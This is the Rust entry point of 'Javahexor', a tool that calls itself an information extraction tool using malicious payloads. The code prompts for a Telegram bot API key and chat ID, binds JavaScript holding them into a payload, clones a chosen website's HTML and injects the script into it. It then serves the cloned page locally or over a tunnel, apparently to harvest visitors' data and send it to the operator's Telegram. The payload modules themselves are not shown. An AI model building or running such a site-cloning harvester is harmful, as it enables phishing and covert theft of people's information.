#[warn(non_snake_case)]
#[warn(unused_imports)]
mod bind;
mod website_cloner;
mod localhost;
mod tunnel;

// use std::io;
use tokio;
use std::io::Write;
// use reqwest;
use bind::{bind_js_to_file, bind_js_to_html};
use website_cloner::download_index_html;
use tunnel::tunnel;
use localhost::{child_server, parent_server};
use std::process::exit;
use std::process::Command;
use anyhow::Context;
use std::fs::File;
use std::io::{BufReader, Read};
#[allow(unused_macros)]
macro_rules! read {
    ($out:ident as $type:ty) => {
        std::io::stdout().flush().unwrap();
        let mut inner = String::new();
        std::io::stdin().read_line(&mut inner).expect("Please Validate the input");
        let $out = inner.trim().parse::<$type>().expect("Parsable");
    };
}


#[tokio::main]
async fn main() -> Result<(), anyhow::Error> {
    // Input api_key and chat_id
    // Here we are using keys and urls only ones so we dont need worry about ownership ;)
    let banner = read_banner("files/banner.md").await;
    loop {
        print_colored_banner(&banner).await?;
        println!();
        println!("Welcome to Javahexor 🦀");
        println!("An Information extraction tool about users using malicious payloads");
        println!(
            "1. Build site from Scrach\n2. Start an HTTP server Locally \n3.Help \n4.Exit"
        );
        print!("Option : ");
        read!(x as u8);

        match x {
            1 => {
                // Will start creating paylaod from scratch
                println!("Clicked Option 1");
                new_users().await?;
                exit(1);
            },
            2 => {
                // Will just start the server
                start_http_server().await?; // dead ;)
                println!();
                exit(1);
            },
            3 => {
                open_help().await?;
                Command::new("clear").status().unwrap();
            },
            _ => {
                println!("Exiting javahexor !");
                exit(1);
            },
        };
    }
}

#[warn(unused_imports)]
async fn new_users() -> Result<(), anyhow::Error>{

    Command::new("clear").status().unwrap();
    print!("Enter the Telebot API KEY : ");
    read!(api_key as String);
    print!("Enter Your Chat_iD :");
    read!(chat_id as String);
    Command::new("clear").status().unwrap();

    let api_key = api_key.trim_end();
    let chat_id = chat_id.trim_end();

    println!("Following Credentials:");

    println!("BOT API_KEY : {} \nCHAT_ID: {}",&api_key, &chat_id);

    bind_js_to_file(api_key, chat_id)?;

    print!("Paste the URL you need to paste : ");
    // let mut url = String::new();
    // io::stdin().read_line(&mut url).unwrap();
    read!(url as String);
    let url = url.trim_end();
    println!("Cloning the site as you need\n");
    let file_path = "payload/index.html";

    download_index_html(url, file_path).await?;
    bind_js_to_html();

    print!("Do you need to start Localhost : [y/n] : ");
    read!(option as String);
    let option = option.trim_end();
    match option{
        "y" => {
            println!("Started Port forwarding Please wait ! : ");
            child_server().await?;
            tunnel().await?;
            // start_with_tunnel.await?;
            exit(1);
        },
        "yes" => {
            println!("Started Port forwarding Please wait ! : ");
            child_server().await?;
            tunnel().await?;
            // start_with_tunnel.await?;
            exit(1);
        },
        _ => {
            println!("Payload Successfully created at /payload folder");
        },
    }


    // println!("Do you need to start localhost the payload binded site ?! y/n" );
    // // let mut option = String::new();
    // // io::stdin().read_line(&mut option).unwrap();
    // read!(option as String);
    // let option :&str = option.trim_end();
    // Command::new("clear").status().unwrap();
    // match option {
    //     "yes" => start_http_server().await?,
    //     "y" => start_http_server().await?,
    //     "YES" => start_http_server().await?,
    //     _ => println!("Payload setup completed : Saved files at /payload dir"),
    // };
    Ok(())
}

async fn open_help() -> Result<(), anyhow::Error>{
    let _help = Command::new("firefox")
        .arg("https://github.com/Whitecat18/Javahexor#quick-help").arg("&").output()
        .with_context(|| "Failed to open Help on browser !").unwrap();
    Ok(())
}

// Need to change the start_http_server slight bit
// 2nd option
async fn start_http_server() -> Result<(), anyhow::Error>{

    println!("start Port forwarding ?");
    println!("decline will start only localhost on machine !");
    print!("Option [y/n]: ");
    read!(opt as String);
    let opt = opt.trim_end();
    Command::new("clear").status().unwrap();
    match opt {
        "yes" => {
            start_with_tunnel().await?;
        },
        "y" => start_with_tunnel().await?,
        _ => {
            println!("Localhost: http://127.0.0.1:8080");
            println!("CTRL+C to Exit");
            parent_server().await?;
        },
    };
    println!("Closed Server Without any error !");

    Ok(())
}

async fn start_with_tunnel() -> Result<(),anyhow::Error> {
    child_server().await?;
    tunnel().await?;
    Ok(())
}

// Banner



async fn read_banner(filename: &str) -> String {
    let file = File::open(filename).expect("Failed to open banner file");
    let mut reader = BufReader::new(file);
    let mut banner = String::new();
    reader.read_to_string(&mut banner).expect("Failed to read banner");
    banner
}

async fn print_colored_banner(banner: &str) -> Result<(),anyhow::Error>{
    let mut stdout = std::io::stdout();
    for line in banner.lines() {
        let color_code = match line.chars().nth(0) {
            Some('A') => "\x1b[31m", // Red for lines starting with 'A'
            Some('B') => "\x1b[32m", // Green for lines starting with 'B'
            Some('C') => "\x1b[33m", // Yellow for lines starting with 'C'
            _ => "\x1b[0m",         // Default color
        };

        writeln!(stdout, "{}{}", color_code, line).unwrap();
    }

    write!(stdout, "\x1b[0m").unwrap(); // Reset color back to normal
    Ok(())
}
